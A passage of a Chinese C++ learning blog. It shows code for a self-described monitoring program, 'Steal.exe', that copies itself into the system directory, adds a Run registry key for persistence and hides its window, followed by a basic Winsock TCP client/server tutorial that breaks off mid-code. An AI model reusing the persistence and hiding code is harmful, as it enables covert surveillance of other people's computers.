class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span>&#123;</span><br><span class="line">HKEY hkey;<span class="comment">//key</span></span><br><span class="line"><span class="type">char</span> currenPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;<span class="comment">//路径</span></span><br><span class="line"><span class="type">char</span> systemPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;<span class="comment">//系统路径</span></span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">LPSTR FileNewName;</span><br><span class="line">LPSTR FileCurrentName;</span><br><span class="line">DWORD type = REG_SZ;</span><br><span class="line">DWORD size = MAX_PATH;</span><br><span class="line">LPCTSTR Rgspath = <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>;<span class="comment">//注册表自启动目录</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">GetSystemDirectory</span>(systemPath, size);</span><br><span class="line"><span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, currenPath, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//copy file</span></span><br><span class="line">FileCurrentName = currenPath;</span><br><span class="line">FileNewName = <span class="built_in">lstrcat</span>(systemPath, <span class="string">&quot;\\Steal.exe&quot;</span>);<span class="comment">//写入注册表这个程序的名称</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_finddata_t</span> Steal;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ret1 = %d\n&quot;</span>, ret);</span><br><span class="line"><span class="keyword">if</span> (_findfirst(FileNewName, &amp;Steal) != <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//已安装</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ret2 = %d\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ihow = <span class="built_in">MessageBox</span>(<span class="number">0</span>, </span><br><span class="line"><span class="string">&quot;该程序只允许用于合法的用途！\n 继续运行该程序将使得这台电脑处于被监控状态,\n 如果您不想这样，请点击\&#x27;取消\&#x27;按钮推出。\n 按下\&#x27;是\&#x27;则该程序将被复制到您的机器上 \</span></span><br><span class="line"><span class="string">\ 并随着系统启动自动运行。\n 按下\&#x27;否\&#x27;则程序只运行一次，不会再您的系统内留下任何东西。&quot;</span>, <span class="string">&quot;警告&quot;</span>, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ihow == IDCANCEL)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ihow == IDNO)&#123;</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//则只运行一次</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//复制文件</span></span><br><span class="line">ret = <span class="built_in">CopyFile</span>(FileCurrentName, FileNewName, TRUE);</span><br><span class="line"><span class="keyword">if</span> (!ret)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入注册表需要管理员打开，不然没权限无法写入</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">ret = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, Rgspath, <span class="number">0</span>, KEY_WRITE, &amp;hkey);</span><br><span class="line"><span class="keyword">if</span> (ret != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">RegCloseKey</span>(hkey);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set Key</span></span><br><span class="line">ret = <span class="built_in">RegSetValueEx</span>(hkey, <span class="string">&quot;Steal&quot;</span>, <span class="literal">NULL</span>, type, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)FileNewName, size);</span><br><span class="line"><span class="keyword">if</span> (ret != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">RegCloseKey</span>(hkey);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最终仍需手动关闭</span></span><br><span class="line"><span class="built_in">RegCloseKey</span>(hkey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个写进注册表的真的是又臭又长。。。说白了还是不会用直接抄。</p><img src="/2022/07/16/winFiles/009.png" class=""><p>编译后记住要管理员启动才能到那一步，不然权限不够。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//首先拿到当前窗口的句柄</span></span><br><span class="line">HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>隐藏就比较直接，通过获取当前窗口句柄，直接调用现成的隐藏掉。</p><img src="/2022/07/16/winFiles/010.png" class=""><p>可以看到先开服务器之后，客户端启用直接闪烁就隐藏了，连接的消息还是在持续发送的一个状态。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>文件遍历，能够第一时间想起<code>WIN32_FIND_DATA</code>结构体</li><li><code>WIN32_FIND_DATA</code>包含了文件名和文件信息，创建时间，访问时间等</li><li>句柄——指针 用来表示windows下的一些对象</li><li>MAX_PATH 预定义的宏，260</li><li>禁用特定警告，比如没有使用_s的安全函数</li><li>隐藏窗口其实挺好记的，注册表这个要多用或者查查文档，感觉也没必要死记硬背</li></ol>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>socket</title>
      <link href="/2022/07/09/socket/"/>
      <url>/2022/07/09/socket/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓套接字(Socket)，就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象。一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。从所处的地位来讲，套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口，是应用程序与网络协议栈进行交互的接口。<br>-百度说的</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>很好，百度说的太抽象看不懂。</p><hr><h2 id="c-x2F-s模式"><a href="#c-x2F-s模式" class="headerlink" title="c&#x2F;s模式"></a>c&#x2F;s模式</h2><p>就是客户端和服务端</p><ul><li>服务端<ul><li>首先服务器启动之后，根据请求提供相应的服务。</li><li>打开一个通信通道，在某一地址和端口上接受请求。</li><li>等待客户请求达到该端口</li><li>接收到重复服务请求，处理该请求并发送应答信号。</li><li>返回第二部，等待另一客户请求</li><li>关闭服务器。</li></ul></li><li>客户端<ul><li>打开一个通信通道，并连接到服务器所在主机的特定端口。</li><li>向服务器发送服务请求，等待并接受应答；继续提出请求。</li><li>请求结束后关闭通信通道并终止。</li></ul></li></ul><p>常见端口，如http服务端口号为80，https为443等</p><hr><h2 id="ip地址和端口号"><a href="#ip地址和端口号" class="headerlink" title="ip地址和端口号"></a>ip地址和端口号</h2><p>win+r打开运行，输入cmd回车都是些基本操作了。</p><p>windows用<code>ipconfig</code><br>linux用<code>ifconfig</code><br>就能查看最基本的几个网卡的信息。</p><p>ip通常指的是网络协议，ip地址则是具体的表现。分为ipv4和ipv6。<br>端口则是为了区分创建的套接字而分配的序号，把IP地址看成房子，端口则是出入的门。<br>端口号可以有65536[即2^16]，其中0-1023一般被用作知名服务器的端口被预定，如www服务选择80端口，ftp服务选择21端口。</p><hr><h2 id="TCP-x2F-UDP"><a href="#TCP-x2F-UDP" class="headerlink" title="TCP&#x2F;UDP"></a>TCP&#x2F;UDP</h2><p>面向连接的套接字</p><ul><li>传输过程中数据不会丢失</li><li>按顺序传输数据</li><li>传输的过程不存在数据边界</li></ul><p>面向消息的套接字</p><ul><li>强调快速传输而非顺序</li><li>传输的数据可能丢失也可能损毁</li><li>限制每次传输数据的大小</li><li>传输的数据有数据边界</li></ul><blockquote><p>数据边界：比如要发送一百条消息，没有必要操心分几次传一次传多少。只要能到达就认为传输结束。</p></blockquote><p>tcp比较像进货，不会太在意量，反正最后都要卖。<br>udp则像快递，每个货物大小重量限制，派送的时候择优先送，路上丢快递也不稀奇。</p><hr><h2 id="网络编程的基本类型和函数"><a href="#网络编程的基本类型和函数" class="headerlink" title="网络编程的基本类型和函数"></a>网络编程的基本类型和函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCK_STREAM[流套接字] <span class="comment">//TCP 面向连接、可靠的数据传输，适合传输大量的数据，不支持广播、多播</span></span><br><span class="line">SOCK_DGRAM[数据包套接字]  <span class="comment">//UDP 无连接 支持广播、多播</span></span><br><span class="line">SOCK_RAM[原始套接字]  <span class="comment">//可以读写内核没有处理的ip数据报，避开TCP/IP处理机制，被传送的数据包可以直接传送需要它的应用程序</span></span><br></pre></td></tr></table></figure><ul><li>引用头文件winsock2.h</li><li>导入ws2_32.lib库</li><li>window下socket变成都要先进行Winsock的初始化</li></ul><img src="/2022/07/09/socket/000.png" class=""><table><thead><tr><th>函数名称</th><th>功能描述</th><th>适用范围</th></tr></thead><tbody><tr><td>socket</td><td>创建套接字</td><td>面向连接的传输+面向无连接的传输</td></tr><tr><td>bind</td><td>套接字与本地ip地址和端口号的绑定</td><td>面向连接的传输+面向无连接的传输</td></tr><tr><td>connect</td><td>请求连接</td><td>面向连接的传输的客户机进程</td></tr><tr><td>listen</td><td>侦听连接请求</td><td>面向连接的传输的服务器进程</td></tr><tr><td>accept</td><td>接受连接请求</td><td>面向连接的传输的服务器进程</td></tr><tr><td>send</td><td>往已建立连接的套接字上发送数据</td><td>面向连接的传输</td></tr><tr><td>recv</td><td>从已建立连接的套接字上接收数据</td><td>面向连接的传输</td></tr><tr><td>sendto</td><td>在无连接的套接字上发送数据</td><td>主要用于无连接的传输</td></tr><tr><td>recvfrom</td><td>在无连接的套接字上接收数据</td><td>主要用于无连接的传输</td></tr><tr><td>close</td><td>关闭套接字</td><td>面向连接的传输+面向无连接的传输</td></tr></tbody></table><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">sockaddr</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (_WIN32_WINNT &lt; 0x0600)</span></span><br><span class="line">    u_short sa_family;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    ADDRESS_FAMILY sa_family;           <span class="comment">// Address family.</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//(_WIN32_WINNT &lt; 0x0600)</span></span></span><br><span class="line"></span><br><span class="line">    CHAR sa_data[<span class="number">14</span>];                   <span class="comment">// Up to 14 bytes of direct address.</span></span><br><span class="line">&#125; SOCKADDR, *PSOCKADDR, FAR *LPSOCKADDR;</span><br></pre></td></tr></table></figure><p>对于sockaddr而言其实就俩成员，<br>一个无符号的短整型，也就是16位的地址类型<br>另一个14个char类型的数据，应该是ip+port</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &lt; 0x0600)</span></span><br><span class="line">    <span class="type">short</span>   sin_family;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">//(_WIN32_WINNT &lt; 0x0600)</span></span></span><br><span class="line">    ADDRESS_FAMILY sin_family;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//(_WIN32_WINNT &lt; 0x0600)</span></span></span><br><span class="line"></span><br><span class="line">    USHORT sin_port;</span><br><span class="line">    IN_ADDR sin_addr;</span><br><span class="line">    CHAR sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125; SOCKADDR_IN, *PSOCKADDR_IN;</span><br></pre></td></tr></table></figure><p>sockaddr_in在基础上多了一些。<br>16位的地址类型<br>16位的端口号<br>32位的ip地址<br>8字节填充</p><p><strong>前者是给操作系统用，因为他把ip和地址混合了，而后者是做了区分。</strong></p><p>对于没有引用头文件的时候想要查看定义就可以从文档下手，已知头文件的话就可以直接跳转到定义。</p><hr><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><h3 id="简易服务器"><a href="#简易服务器" class="headerlink" title="简易服务器"></a>简易服务器</h3><img src="/2022/07/09/socket/001.png" class=""><p>模型上都差不多的路数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TCP Server!\n&quot;</span>);</span><br><span class="line"><span class="comment">//#ifdef 0</span></span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);     <span class="comment">//用winsock2头文件就写2</span></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//#endif // 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span>(SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;listen errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKADDR_IN addCli;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">//分出子对象处理请求</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line">SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addCli, &amp;len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line"><span class="type">char</span> sendBUf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//sprintf_s(sendBUf, 100, &quot;Welcome %s to China!&quot;, inet_ntoa(addCli.sin_addr));</span></span><br><span class="line"><span class="built_in">sprintf_s</span>(sendBUf, <span class="number">100</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="comment">//收发数据</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">send</span>(sockConn, sendBUf, <span class="built_in">strlen</span>(sendBUf),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">iLen = <span class="built_in">recv</span>(sockConn, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recvBuf: %s&quot;</span>, recvBuf);</span><br><span class="line"><span class="comment">//关闭子对象</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockConn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务结束关闭</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSer);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="简易客户端"><a href="#简易客户端" class="headerlink" title="简易客户端"></a>简易客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TCP Client\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置要连接的服务器</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.10.102&quot;</span>);<span class="comment">//本机ip地址测试</span></span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发数据，对比服务器，客户端应是先收后发</span></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">recv</span>(sockCli, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recvBuf = %s\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">iLen = <span class="built_in">send</span>(sockCli, (<span class="type">char</span>*)sendBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本质上其实跟服务器差不多，像初始化网络库就肯定要套用的。</p><p>然后先回到之前服务器的debug目录右击管理员打开<br>然后vs debug跑现在的服务器</p><img src="/2022/07/09/socket/003.png" class=""><p>发现有回应了。</p><img src="/2022/07/09/socket/004.png" class=""><img src="/2022/07/09/socket/005.png" class=""><p>如果出现这些问题，需要注意服务器是否启动，或者客户端设置的服务器ip地址是否正确，如果套在本地虚拟网卡上，这个网卡又正好没启动也是无响应的状态。建议就直接配在连接的有线网卡或者无线网卡ip。</p><hr><p>修改之前服务器连接的时候发送的消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span 